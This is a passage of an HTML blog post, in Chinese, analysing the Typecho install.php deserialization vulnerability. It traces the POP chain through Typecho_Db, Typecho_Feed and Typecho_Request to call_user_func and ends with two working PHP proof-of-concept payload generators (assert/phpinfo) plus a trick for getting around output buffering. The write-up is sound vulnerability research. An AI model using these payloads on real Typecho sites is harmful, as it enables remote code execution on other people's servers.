@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Typcho反序列化漏洞分析影响范围：2017年10月24日之前的所有版本 环境搭建：下载地址：http:&#x2F;&#x2F;typecho.org&#x2F;，这里主要是说下，在intall之前，需要我们手动去数据库添加Typecho数据库 我之前去官网下载的0.9的版本，结果复现失败，想下载之前的版本，官网也没有了，这里找到了1.0.14版本 链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Cc7qJfGSwV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Typcho反序列化漏洞分析">
+<meta property="og:url" content="http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="w0s1np&#39;s blog">
+<meta property="og:description" content="Typcho反序列化漏洞分析影响范围：2017年10月24日之前的所有版本 环境搭建：下载地址：http:&#x2F;&#x2F;typecho.org&#x2F;，这里主要是说下，在intall之前，需要我们手动去数据库添加Typecho数据库 我之前去官网下载的0.9的版本，结果复现失败，想下载之前的版本，官网也没有了，这里找到了1.0.14版本 链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Cc7qJfGSwV">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wzimg/10.png">
+<meta property="og:image" content="http://example.com/wzimg/11.png">
+<meta property="og:image" content="http://example.com/wzimg/12.png">
+<meta property="og:image" content="http://example.com/wzimg/13.png">
+<meta property="og:image" content="http://example.com/wzimg/14.png">
+<meta property="og:image" content="http://example.com/wzimg/15.png">
+<meta property="og:image" content="http://example.com/wzimg/16.png">
+<meta property="og:image" content="http://example.com/wzimg/17.png">
+<meta property="og:image" content="http://example.com/wzimg/18.png">
+<meta property="og:image" content="http://example.com/wzimg/19.png">
+<meta property="og:image" content="http://example.com/wzimg/20.png">
+<meta property="og:image" content="http://example.com/wzimg/21.png">
+<meta property="og:image" content="http://example.com/wzimg/22.png">
+<meta property="og:image" content="http://example.com/wzimg/23.png">
+<meta property="og:image" content="http://example.com/wzimg/24.png">
+<meta property="og:image" content="http://example.com/wzimg/25.png">
+<meta property="article:published_time" content="2021-04-10T09:39:57.000Z">
+<meta property="article:modified_time" content="2021-04-12T06:28:34.247Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="漏洞分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wzimg/10.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Typcho反序列化漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/projects_url">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/04/10/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/04/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&text=Typcho反序列化漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&is_video=false&description=Typcho反序列化漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Typcho反序列化漏洞分析&body=Check out this article: http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&title=Typcho反序列化漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&name=Typcho反序列化漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/04/10/Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/&t=Typcho反序列化漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Typcho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Typcho反序列化漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">环境搭建：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞分析：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Typcho反序列化漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-10T09:39:57.000Z" itemprop="datePublished">2021-04-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>, <a class="tag-link-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Typcho反序列化漏洞分析"><a href="#Typcho反序列化漏洞分析" class="headerlink" title="Typcho反序列化漏洞分析"></a>Typcho反序列化漏洞分析</h2><h3 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h3><p>2017年10月24日之前的所有版本</p>
+<h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>下载地址：<code>http://typecho.org/</code>，这里主要是说下，在<code>intall</code>之前，需要我们手动去数据库添加<code>Typecho</code>数据库</p>
+<p>我之前去官网下载的0.9的版本，结果复现失败，想下载之前的版本，官网也没有了，这里找到了1.0.14版本</p>
+<p>链接：<code>https://pan.baidu.com/s/1Cc7qJfGSwVop9L1X4pC67Q </code> 提取码：<code>fwvp </code></p>
+<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>漏洞入口：<code>install.php</code>246行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$config</span> = unserialize(base64_decode(Typecho_Cookie::get(<span class="hljs-string">&#x27;__typecho_config&#x27;</span>)));<br>	<span class="hljs-variable">$type</span> = explode(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>]);<br>	<span class="hljs-variable">$type</span> = array_pop(<span class="hljs-variable">$type</span>);<br><br>	<span class="hljs-keyword">try</span> &#123;<br>		<span class="hljs-variable">$installDb</span> = <span class="hljs-keyword">new</span> Typecho_Db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br>		<span class="hljs-variable">$installDb</span>-&gt;addServer(<span class="hljs-variable">$config</span>, Typecho_Db::READ | Typecho_Db::WRITE);<br>    	&#125;   <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>明显的一个反序列化函数，但是如何利用呢，反序列化能够利用的点必须要有相应的魔术方法配合。其中比较关键的有这几个。</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">__destruct</span>()</span><br><span class="hljs-function"><span class="hljs-title">__wakeup</span>()</span><br><span class="hljs-function"><span class="hljs-title">__toString</span>()</span><br><span class="hljs-function"><span class="hljs-title">__call</span>()</span><br><span class="hljs-function"><span class="hljs-title">__get</span>()</span><br></code></pre></td></tr></table></figure>
+
+<p>其中<code>__destruct()</code>是在对象被销毁的时候自动调用，<code>__Wakeup</code>在反序列化的时候自动调用，<code>__toString()</code>是在调用对象当作字符串的时候自动调用。<code>__call()</code>是在对象调用的方法不存在的时候自动调用。<code>__get()</code>是在读取不可访问的属性的值的时候自动调用</p>
+<p>先查看<code>Typecho_Cookie</code>类中的<code>get()</code>函数吧：存在于<code>Cookie.php</code></p>
+<p><img src="/wzimg/10.png" alt="e"></p>
+<p>这里的<code>key</code>即是<code>__typecho_config</code>，我们可以通过<code>COOKIE</code>或者<code>POST</code>传参并返回成为<code>config</code>，<code>install.php</code>又存在这个代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$installDb</span> = <span class="hljs-keyword">new</span> Typecho_Db(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;adapter&#x27;</span>], <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;prefix&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>说明<code>Typecho_Db</code>类的参数我们可控，回溯<code>Typecho_Db</code>类：存在于<code>Db.php</code></p>
+<p><img src="/wzimg/11.png" alt="f"></p>
+<p>这里的<code>adapterName</code>就是我们可控的<code>config</code>，发现这里对<code>adapterName</code>进行了字符替换，那当它为一个类的时候，那么就会自动调用<code>__toString()</code>方法</p>
+<p>所以这里如果构造的反序列化是一个数组，其中<code>adapter</code>设置为某个类，就可以触发相应类的<code>__toString</code>方法</p>
+<p>全局搜索<code>toString</code></p>
+<p>在<code>Typecho/var/Typecho/Feed.php</code>可以利用：</p>
+<p><img src="/wzimg/12.png" alt="a"></p>
+<p>顺着分析<code>__tostring()</code>函数</p>
+<p>290行 调用了<code>$item[&#39;author&#39;]-&gt;screenName</code>，<code>$items</code>这是一个当前类的私有变量，<code>$item</code>又是由<code>$items</code>遍历而来，所以可控</p>
+<p><img src="/wzimg/13.png" alt="b"></p>
+<p>这里的<code>item[&#39;author&#39;]</code>调用了<code>sceenName</code>方法，若<code>item[&#39;author&#39;]</code>为一个类时，而且不存在<code>sceenName</code>方法时，就会调用<code>__get</code>魔术方法，所以全局搜索<code>__get</code>魔术方法。</p>
+<p><code>/var/Typecho/Request.php</code>发现可以利用</p>
+<p><img src="/wzimg/14.png" alt="c"></p>
+<p>回溯<code>get()</code>函数</p>
+<p><img src="/wzimg/15.png" alt="d"></p>
+<p>跟进<code>applyFilter</code>函数：</p>
+<p><img src="/wzimg/16.png" alt="g"></p>
+<p>存在危险函数<code>call_user_func</code></p>
+<p><img src="/wzimg/17.png" alt="h"></p>
+<p><img src="/wzimg/18.png" alt="j"></p>
+<p>发现<code>filter</code>是可控的</p>
+<p><img src="/wzimg/19.png" alt="k"></p>
+<p>发现<code>value</code>是通过<code>params</code>传值的，</p>
+<p><img src="/wzimg/20.png" alt="l"></p>
+<p><code>params</code>可控，所以<code>value</code>可控，所以<code>call_user_func</code>函数可以使用</p>
+<p>回溯整条<code>pop chain</code>：</p>
+<p>首先就是反序列化可控的<code>__typecho_config</code>，又对此实例化，使之成为<code>Typecho_Cookie</code>类中的<code>key</code>值，然后我们可以POST传入参数<code>key</code>即<code>__typecho_config</code>，在<code>Typecho_Cookie</code>类中又存在<code>adapterName</code>变量进行字符串的使用，而且<code>adapterName</code>即为<code>config[&#39;adapter&#39;]</code>可控，当我们使之为<code>Feed.php</code>文件中的<code>Typecho_Feed</code>类时，又会调用该类的<code>__toString()</code>魔术方法，此类又存在可控变量<code>$item[&#39;author&#39;]</code>调用<code>screenName</code>，当可控参数为一个没有<code>screenName </code>方法的类的时候，就会调用<code>__get()</code>魔术方法，最后就到了<code>Typecho_Request</code>类了，最好找到可以利用的危险函数<code>call_user_func</code></p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">install.php::__typecho_config<span class="hljs-function"> (即为T<span class="hljs-params">ypecho_Cookie</span>类中的<span class="hljs-params">key</span>值，通过<span class="hljs-params">post</span>传参成为<span class="hljs-params">config</span>)  =&gt;</span>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Db</span>.</span></span>php::Typecho_Db<span class="hljs-function"> (<span class="hljs-params">adapterName</span>即为<span class="hljs-params">config</span>[&#x27;<span class="hljs-params">adapter</span>&#x27;])  =&gt;</span>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Feed</span>.</span></span>php::Typecho_Feed::<span class="hljs-constructor">__toString()</span>::$item<span class="hljs-literal">[&#x27;<span class="hljs-identifier">author</span>&#x27;]</span>-&gt;screenName<span class="hljs-function"> (<span class="hljs-params">$item</span>[&#x27;<span class="hljs-params">author</span>&#x27;]可控)  =&gt;</span>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Request</span>.</span></span>php::Typecho_Request::<span class="hljs-constructor">__get()</span>::get<span class="hljs-literal">()</span>::apply<span class="hljs-constructor">Filter()</span>::call_user_func<br></code></pre></td></tr></table></figure>
+
+<p>最后在<code>install.php</code>还存在两个<code>exit</code>，我们需要满足他们：</p>
+<p><img src="/wzimg/21.png" alt="q"></p>
+<p>就是 </p>
+<p> 1.finish参数不为空</p>
+<p>2.Referer为本站</p>
+<p>构造poc：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;assert&#x27;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;sceenName&#x27;</span>]=<span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-string">&#x27;0&#x27;</span>]=<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;author&#x27;</span>=&gt;<span class="hljs-keyword">new</span> Typecho_Request(),<br>        );<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$a</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span><br>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$b</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>当提交<code>payload</code>后，服务器会回显500：</p>
+<p><img src="/wzimg/22.png" alt="w"></p>
+<p>到这里就理解不了了，根据<code>https://paper.seebug.org/424/</code>讲解如下：</p>
+<p>在<code>install.php</code>的开始，调用了<code>ob_start()</code></p>
+<p><img src="/wzimg/23.png" alt="a"></p>
+<p>因为我们上面对象注入的代码触发了原本的exception，导致<code>ob_end_clean()</code>执行，原本的输出会在缓冲区被清理。</p>
+<p>我们必须想一个办法强制退出，使得代码不会执行到exception，这样原本的缓冲区数据就会被输出出来。</p>
+<p>这里有两个办法。 1、因为<code>call_user_func</code>函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 2、第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。最后POC：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// $this-&gt;_params[&#x27;screenName&#x27;] = &#x27;whoami&#x27;;</span><br>        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&#x27;screenName&#x27;</span>] = -<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&#x27;RSS 2.0&#x27;</span>;<br>    <span class="hljs-comment">/** 定义ATOM 1.0类型 */</span><br>    <span class="hljs-keyword">const</span> ATOM1 = <span class="hljs-string">&#x27;ATOM 1.0&#x27;</span>;<br>    <span class="hljs-comment">/** 定义RSS时间格式 */</span><br>    <span class="hljs-keyword">const</span> DATE_RFC822 = <span class="hljs-string">&#x27;r&#x27;</span>;<br>    <span class="hljs-comment">/** 定义ATOM时间格式 */</span><br>    <span class="hljs-keyword">const</span> DATE_W3CDTF = <span class="hljs-string">&#x27;c&#x27;</span>;<br>    <span class="hljs-comment">/** 定义行结束符 */</span><br>    <span class="hljs-keyword">const</span> EOL = <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dateFormat</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-built_in">self</span>::RSS2;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;link&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;title&#x27;</span>] = <span class="hljs-string">&#x27;2&#x27;</span>;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;date&#x27;</span>] = <span class="hljs-number">1507720298</span>;<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;author&#x27;</span>] = <span class="hljs-keyword">new</span> Typecho_Request();<br>        <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;category&#x27;</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Typecho_Request());<br><br>        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-variable">$item</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Typecho_Feed();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;host&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>    <span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-string">&#x27;xxxxxx&#x27;</span>,<br>    <span class="hljs-string">&#x27;charset&#x27;</span> =&gt; <span class="hljs-string">&#x27;utf8&#x27;</span>,<br>    <span class="hljs-string">&#x27;port&#x27;</span> =&gt; <span class="hljs-string">&#x27;3306&#x27;</span>,<br>    <span class="hljs-string">&#x27;database&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho&#x27;</span>,<br>    <span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$x</span>,<br>    <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho_&#x27;</span><br>);<br><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/wzimg/24.png" alt="v"></p>
